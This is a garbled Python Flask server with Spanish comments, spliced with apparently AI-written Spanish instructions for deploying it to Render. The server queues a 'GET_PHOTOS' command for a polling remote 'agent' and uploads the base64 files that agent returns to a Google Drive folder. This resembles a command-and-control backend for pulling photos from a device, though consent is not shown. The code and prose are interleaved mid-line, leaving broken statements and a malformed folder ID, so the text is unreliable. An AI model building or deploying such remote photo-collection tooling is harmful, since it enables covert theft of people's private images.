import os
import json
import base64
import uuid
from flask import Flask, request, jsonify, send_from_directory
from pydrive2.auth import GoogleAuth
from pydrive2.drive import GoogleDrive
from io import BytesIO

# --- CONFIGURACIÓN ---
# El ID de tu carpeta de Drive. Ya lo tienes configurado.
DRIVE_FOLDER_ID = 'AQUÍ_VA_EL_ID_DE_TU_CARPETA_DE_DRIVE' 

app = Flask(__name__)
pending_command = None

# --- FUNCIÓN DE AUTENTICACIÓN PARA RENDER ---
def authenticate_gdrive():
    gauth = GoogleAuth()
    
    # Leemos las credenciales desde la variable de entorno de Render
    # que configuraremos más tarde.
    secrets_json_str = os.environ.get('GOOGLE_CLIENT_SECRETS')
    if not secrets_json_str:
        # Si no encuentra la variable, el programa no puede continuar.
        raise Exception("Variable de entorno 'GOOGLE_CLIENT_SECRETS' no encontrada o vacía.")

    # Convertimos la cadena de texto JSON a un diccionario de Python
    secrets_dict = json.loads(secrets_json_str)
    
    # Autenticamos usando el diccionario. Este método es robusto para servidores.
    gauth.auth_method = 'service'
    gauth.credentials = gauth.get_credentials_from_service_account(
        service_account_dict=secrets_dict,
        scopes=['https://www.googleapis.com/auth/drive']
    )
    gauth.Authorize()
    
    drive = GoogleDrive(gauth)
    return drive

# --- INICIALIZACIÓN ---
try:
    drive = authenticate_gdrive()
    print("Autenticación con Google Drive configurada.")
except Exception as e:
    print(f"ERROR CRÍTICO AL INICIAR: No se pudo autenticar con Google Drive.")
    print(¡Excelente decisión! Es el paso lógico para convertir tu proyecto en un servicio robusto y profesional. Olvidémonos de `localtunnel` y de tener la PC encendida. ¡Vamos a la nube!

Aquí tienes el plan de acción completo y detallado para desplegar en Render.

---

### **Fase 1: Preparar tu Proyecto para Render**

Necesitamos añadir dos archivos clave y modificar uno existente.

**Paso 1: Crea el archivo `requirements.txt`**

Este archivo le dice a Render qué librerías de Python necesita instalar.

1.  En la carpeta de tu proyecto (`sample app pshop`), crea un nuevo archivo de texto.
2.  Nómbralo **`requirements.txt`**.
3.  Ábrelo y pega esta lista:
    ```
    Flask
    gunicorn
    PyDrive2
    google-api-python-client
    google-auth-httplib2
    google-auth-oauthlib
    ```

**Paso 2: Modifica `app.py` para Producción**

Tenemos que hacer dos cambios importantes en `app.py`:
1.  **Leer las credenciales de forma segura** desde las variables de entorno de Render, no desdef"Detalle: {e}")
    drive = None

# --- ENDPOINTS (Igual que antes) ---
@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/trigger-fetch', methods=['POST'])
def trigger_fetch_photos():
    global pending_command
    pending_command = "GET_PHOTOS"
    print(f"[SERVER] ¡ORDEN RECIBIDA! Comando '{pending_command}' puesto en cola.")
    return jsonify({"status": "success"})

@app.route('/get-command', methods=['GET'])
def get_command_for_agent():
    global pending_command
    print(f"[AGENT-CHECK] Agente reportado...")
    if pending_command:
        command_to_send = pending_command
        pending_command = None 
        print(f"[SERVER] -> Orden '{command_to_send}' entregada.")
        return jsonify({"command": command_to_send})
    else:
        print("[SERVER] -> No hay órdenes pendientes.")
        return jsonify({"command": "NONE"})

@app.route('/upload', methods=['POST'])
def upload_to_drive():
    if not drive:
        return jsonify({"status": "error", "message": "El servidor no tiene conexión con Google Drive."}), 503

    print("[SERVER] Recibiendo datos del agente para subir a Google Drive...")
    data = request.json
    
    if not data or 'files' not in data:
        return jsonify({"status": "error", "message": "Formato de datos incorrecto."}), 400

    for file_info in data.get('files', []):
        original_filename = file_info.get('name', 'unknown_file')
        base64_string = file_info.get('data')

        if not base64_string:
            continue
        
        try:
            file_bytes = base64.b64decode(base64_string)
            file_in_memory = BytesIO(file_bytes)
            unique_filename = f"{uuid.uuid4().hex}_{original_filename}"
            
            drive_file = drive.CreateFile({
                'title': unique_filename,
                'parents': [{'id': DRIVE_FOLDER_ID}]
            })
            drive_file.content = file_in_memory
            drive_file.Upload({'convert': True}) # convert=True puede ayudar con algunos un archivo.
2.  Asegurarnos de que no hay código de prueba que no vayamos a usar.

**Reemplaza el contenido de tu `app.py` con esta versión final para Render:**

```python
import os
import json # Importamos la librería para manejar JSON
import base64
import uuid
from flask import Flask, request, jsonify, send_from_directory
from pydrive2.auth import GoogleAuth
from pydrive2.drive import GoogleDrive
from io import BytesIO

# --- CONFIGURACIÓN ---
# El ID de tu carpeta de Drive no cambia.
DRIVE_FOLDER_ID = 'DRIVE_FOLDER_ID = '1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO' # ¡Asegúrate de que este ID es correcto!

app = Flask(__name__, static_folder=None) # Desactivamos la carpeta estática por defecto de Flask
pending_command = None

# --- FUNCIÓN DE AUTENTICACIÓN PARA RENDER ---
def authenticate_gdrive():
    gauth = GoogleAuth()
    
    # Leemos las credenciales desde la variable de entorno de Render
    secrets_json_str = os.environ.get('GOOGLE_CLIENT_SECRETS')
    if not secrets_json_str:
        # Si la app corre y no encuentra la variable, fallará, lo cual es bueno para depurar.
        raise Exception("Variable de entorno 'GOOGLE_CLIENT_SECRETS' no encontrada.")

    # Convertimos la cadena de texto JSON a un diccionario de Python
    secrets_dict = json.loads(secrets_json_str)
    
    # Autenticamos usando el diccionario directamente
    gauth.auth_method = 'service'
    gauth.credentials = gauth.get_credentials_from_service_account(
        service_account_dict=secrets_dict,
        scopes=['https://www.googleapis.com/auth/drive'] # Alcance necesario
    )
    gauth.Authorize()
    
    drive = Google formatos de video
            
            print(f"[SUCCESS] Archivo '{original_filename}' subido a Drive.")
        except Exception as e:
            print(f"[ERROR] No se pudo subir el archivo '{original_filename}' a Drive: {e}")
    
    return jsonify({"status": "success"})

# --- PUNTO DE ARRANQUE PARA RENDER ---
# Gunicorn buscará la variable 'app' en este archivo.
# No necesitamos el bloque if __name__ == '__main__' para Gunicorn.